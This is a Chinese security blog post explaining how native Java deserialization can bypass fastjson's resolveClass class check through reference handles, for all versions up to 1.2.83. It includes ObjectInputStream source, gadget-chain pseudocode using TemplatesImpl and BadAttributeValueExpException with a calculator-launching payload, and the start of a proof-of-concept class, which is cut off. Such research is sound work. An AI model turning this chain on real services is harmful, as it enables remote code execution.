---
title: FastJson与原生反序列化(二)
url: https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/
source: Y4tacker's Blog
date: 2023-04-27
fetch_date: 2025-10-04T11:31:59.596157
---

# FastJson与原生反序列化(二)

* [Home](/)
* [Writing](/archives/)
* [Topics](/tags/)
* [Search](/search/)
* [About](/about/)
* [Friends](/link/)

Previous post Next post Back to top Share post

1. [1. FastJson与原生反序列化(二)](#FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C)
   1. [1.1. 回顾](#%E5%9B%9E%E9%A1%BE)
   2. [1.2. resolveClass的调用](#resolveClass%E7%9A%84%E8%B0%83%E7%94%A8)
      1. [1.2.1. 不安全的反序列化过程](#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B)
      2. [1.2.2. 安全的反序列化过程](#%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B)
   3. [1.3. 如何利用引用类型](#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B)
   4. [1.4. 完整利用](#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8)

# FastJson与原生反序列化(二)

Y4tacker

2023-04-26 (Updated: 2024-08-04)

[Java](/categories/Java/)

[Fastjson](/tags/Fastjson/), [Java](/tags/Java/)

# FastJson与原生反序列化(二)

很早之前在发第一篇的时候@jsjcw师傅就曾提到1.2.49后也能利用引用绕过，后面由@1ue师傅在知识星球中利用这个思路成功绕过并分享了payload，至此fastjson全版本就彻底加入原生反序列化的gadget，向师傅们致敬，想着将文章完善的缘故，并且师傅们没有提到具体的原理，因此发个第二篇进行简单介绍。

当然这里不会详细说明完整的序列化与反序列化的过程，如果有感兴趣的可以参考panda师傅的博客，关于[序列化流程分析总结](https://www.cnpanda.net/sec/893.html)与[反序列化流程分析总结](https://www.cnpanda.net/sec/928.html)，里面已经写的很细致了。

## 回顾

之前提到了从1.2.49开始，我们的JSONArray以及JSONObject方法开始真正有了自己的readObject方法，

![image-20230426095410017](/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/image-20230426095410017.png)

在其`SecureObjectInputStream`类当中重写了`resolveClass`,通过调用了`checkAutoType`方法做类的检查，这样真的是安全的么？

## resolveClass的调用

乍一看，这样的写法很安全，当调用JSONArray/JSONObject的Object方法触发反序列化时，将这个反序列化过程委托给`SecureObjectInputStream`处理时，触发resolveClass实现对恶意类的拦截

这时候反序列化的调用过程是这样的，就是这样不安全的ObjectInputStream套个安全的SecureObjectInputStream导致了绕过

### 不安全的反序列化过程

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` ObjectInputStream -> readObject xxxxxx(省略中间过程) SecureObjectInputStream -> readObject -> resolveClass ``` |

### 安全的反序列化过程

多提一嘴，平时我们作防御则应该是生成一个继承ObjectInputStream的类并重写resolveClass(假定为TestInputStream)，由它来做反序列化的入口，这样才是安全的，因此压力再次给到了开发身上

|  |  |
| --- | --- |
| ``` 1 ``` | ``` TestInputStream -> readObject -> resolveClass ``` |

为了解决这个问题，首先我们就需要看看什么情况下不会调用resolveClass，在`java.io.ObjectInputStream#readObject0`调用中，会根据读到的bytes中tc的数据类型做不同的处理去恢复部分对象

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 ``` | ``` switch (tc) {                 case TC_NULL:                     return readNull();                 case TC_REFERENCE:                     return readHandle(unshared);                 case TC_CLASS:                     return readClass(unshared);                 case TC_CLASSDESC:                 case TC_PROXYCLASSDESC:                     return readClassDesc(unshared);                 case TC_STRING:                 case TC_LONGSTRING:                     return checkResolve(readString(unshared));                 case TC_ARRAY:                     return checkResolve(readArray(unshared));                 case TC_ENUM:                     return checkResolve(readEnum(unshared));                 case TC_OBJECT:                     return checkResolve(readOrdinaryObject(unshared));                 case TC_EXCEPTION:                     IOException ex = readFatalException();                     throw new WriteAbortedException("writing aborted", ex);                 case TC_BLOCKDATA:                 case TC_BLOCKDATALONG:                     if (oldMode) {                         bin.setBlockDataMode(true);                         bin.peek();             // force header read                         throw new OptionalDataException(                             bin.currentBlockRemaining());                     } else {                         throw new StreamCorruptedException(                             "unexpected block data");                     }                 case TC_ENDBLOCKDATA:                     if (oldMode) {                         throw new OptionalDataException(true);                     } else {                         throw new StreamCorruptedException(                             "unexpected end of block data");                     }                 default:                     throw new StreamCorruptedException(                         String.format("invalid type code: %02X", tc));             } ``` |

再往后，跳过一些细节过程，上面的不同case中大部分类都会最终调用`readClassDesc`去获取类的描述符，在这个过程中如果当前反序列化数据下一位仍然是`TC_CLASSDESC`那么就会在`readNonProxyDesc`中触发`resolveClass`

再回到上面这个switch分支的代码，不会调用`readClassDesc`的分支有`TC_NULL`、`TC_REFERENCE`、`TC_STRING`、`TC_LONGSTRING`、`TC_EXCEPTION`，string与null这种对我们毫无用处的，exception类型则是解决序列化终止相关，这一点可以从其描述看出

![image-20230426102949380](/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/image-20230426102949380.png)

那么就只剩下了reference引用类型了

## 如何利用引用类型

现在我们就要思考，如何在JSONArray/JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型从而绕过resolveClass的检查

答案是当向List、set、map类型中添加同样对象时即可成功利用，这里也简单提一下，这里以List为例，

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` ArrayList<Object> arrayList = new ArrayList<>(); arrayList.add(templates); arrayList.add(templates); writeObjects(arrayList); ``` |

当我们写入对象时，会在`handles`这个哈希表中建立从对象到引用的映射

![image-20230426105607843](/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/image-20230426105607843.png)

当再次写入同一对象时，在`handles`这个hash表中查到了映射

![image-20230426110435564](/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/image-20230426110435564.png)

那么就会通过`writeHandle`将重复对象以引用类型写入

![image-20230426110523137](/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/image-20230426110523137.png)

因此我们就可以利用这个思路构建攻击的payload了，这里简单以伪代码呈现，便于理解思路

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 ``` | ``` TemplatesImpl templates = TemplatesImplUtil.getEvilClass("open -na Calculator"); ArrayList<Object> arrayList = new ArrayList<>(); arrayList.add(templates);  JSONArray jsonArray = new JSONArray(); jsonArray.add(templates);  BadAttributeValueExpException bd = getBadAttributeValueExpException(jsonArray); arrayList.add(bd);    WriteObjects(arrayList); ``` |

简单梳理下

序列化时，在这里templates先加入到arrayList中，后面在JSONArray中再次序列化TemplatesImpl时，由于在`handles`这个hash表中查到了映射，后续则会以引用形式输出

反序列化时ArrayList先通过readObject恢复TemplatesImpl对象，之后恢复BadAttributeValueExpException对象，在恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray/JSONObject对象，会触发JSONArray/JSONObject的readObject方法，将这个过程委托给`SecureObjectInputStream`，在恢复JSONArray/JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过

当然前面也提到了不仅仅是List，Set与Map类型都能成功触发引用绕过。

## 完整利用

至此fastjson全版本实现了原生反序列化利用

代码测试依赖

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ``` | ``` <dependency>     <groupId>com.alibaba</groupId>     <artifactId>fastjson</artifactId>     <version>1.2.83</version> </dependency> <dependency>     <groupId>org.javassist</groupId>     <artifactId>javassist</artifactId>     <version>3.27.0-GA</version> </dependency> ``` |

测试代码以HashMap为例

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 ``` | ``` import com.alibaba.fastjson.JSONArray; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap;  import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import javassist.ClassPool; import javassist.CtClass; import javassist.CtConstructor; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;   public class Y4HackJSON {     public static void setValue(Object obj, String name, Object value) throws Exception{         Field field = obj.getClass().getDeclaredField(name);         field.setAccessible(true);        ...